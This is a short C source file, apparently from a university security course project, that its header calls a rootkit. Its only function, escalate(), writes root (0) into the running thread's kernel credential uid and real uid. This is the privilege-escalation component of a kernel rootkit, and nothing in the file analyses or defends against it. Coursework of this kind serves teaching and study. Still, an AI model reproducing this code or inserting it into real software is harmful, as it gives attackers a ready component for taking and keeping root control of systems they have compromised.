/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * Function to modify ucred struct
 * 	to escalate privileges to root
 */

#include "trivial.h"

void
escalate (struct thread *td)
{
	uid_t root = 0;
	
	/* Uupdate uid */
	td->td_ucred->cr_uid = root;
	td->td_ucred->cr_ruid = root;
}
